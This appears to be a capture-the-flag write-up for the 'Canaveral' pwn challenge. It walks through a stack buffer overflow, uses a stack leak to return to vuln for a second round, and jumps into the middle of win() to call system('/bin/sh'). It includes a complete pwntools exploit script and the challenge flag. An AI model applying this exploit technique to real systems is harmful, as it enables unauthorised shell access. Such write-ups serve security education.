# Canaveral

```
NASA Mission Control needs your help... only YOU can enter the proper launch sequence!!

    canaveral

nc chal.sunshinectf.games 25603 
```

Decompile in IDA:

```c
int vuln()
{
  _QWORD buf[5]; // [rsp+0h] [rbp-40h] BYREF
  _QWORD v2[3]; // [rsp+28h] [rbp-18h]

  memset(buf, 0, sizeof(buf));
  v2[0] = 0;
  *(_QWORD *)((char *)v2 + 6) = 0;
  printf("Enter the launch sequence: ");
  read(0, buf, 0x64u);
  return printf("Successful launch! Here's your prize: %p\n", buf);
}

void __fastcall win(int a1, const char *a2)
{
  if ( a1 == 201527 && a2 && !memcmp(a2, "/bin/sh", 7u) )
    system(a2);
}
```

There is a stack overflow in `read(0, buf, 0x64u)`. We can override return address to `win`. However, it validates the arguments. Let's see if we can bypass the check by jumping to the body of `win` instead of its entrypoint:

```asm
.text:00000000004011FD                 mov     edx, 7          ; n
.text:0000000000401202                 lea     rcx, aBinSh     ; "/bin/sh"
.text:0000000000401209                 mov     rsi, rcx        ; s2
.text:000000000040120C                 mov     rdi, rax        ; s1
.text:000000000040120F                 call    _memcmp
.text:0000000000401214                 test    eax, eax
.text:0000000000401216                 jnz     short loc_40122E
.text:0000000000401218                 mov     rax, [rbp+s1]
.text:000000000040121C                 mov     rdi, rax        ; command
.text:000000000040121F                 mov     eax, 0
.text:0000000000401224                 call    _system
```

If we jump to `0x401218`, then the effective instructions are:

```
.text:0000000000401218                 mov     rax, [rbp+s1]
.text:000000000040121C                 mov     rdi, rax        ; command
.text:000000000040121F                 mov     eax, 0
.text:0000000000401224                 call    _system
```

Then, we only need to put the address of `/bin/sh` (it is 0x402008 in binary) to `rbp+s1` (rbp-0x10 in fact), then it will call `system("/bin/sh")` for us.

How do we put the address of `/bin/sh` to rbp-0x10? The code leaks the stack for us, but it returns immediately:

```c
int vuln()
{
  // ..., leak stack
  return printf("Successful launch! Here's your prize: %p\n", buf);
}
```

So we can leak stack address for the first round while overwriting the return address to `vuln`, which gives us another round to attack. In the second round, we put the address of `/bin/sh` on the stack, overrides the saved rbp so that the new rbp minus 0x10 stores the address of `/bin/sh`, then we jump to `0x401218` to get shell:

```python
from pwn import *

elf = ELF("./canaveral")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

p = remote("chal.sunshinectf.games", 25603)
# p = process(["./canaveral"])
# gdb.attach(p)
# pause()
# two rounds
# first round jump back to vuln leak stack address
vuln_addr = elf.symbols["vuln"]
p.sendline(b"A" * 0x40 + p64(0) + p64(vuln_addr))
buf_addr = int(p.recvline().split()[-1], 16)

# second round, set rbp & save &"/bin/sh" to rbp+0x10
ret_addr = 0x40101A # ret gadget to balance stack
system_mid_addr = 0x401218
bin_sh_addr = next(elf.search(b"/bin/sh"))
# the address of bin_sh_addr is new_buf+0x40+0x8*3 = new_buf+0x58
# set rbp to buf+0x70, new_buf=buf-0x8 due to first round, then rbp-0x10 = buf+0x60 == new_buf+0x58
p.sendline(
    b"A" * 0x40 + p64(buf_addr + 0x70) + p64(ret_addr) + p64(system_mid_addr) + p64(bin_sh_addr)
)
p.interactive()
```

Flag: `sun{D!d_y0u_s3e_thE_IM4P_spAce_laUncH??}`.
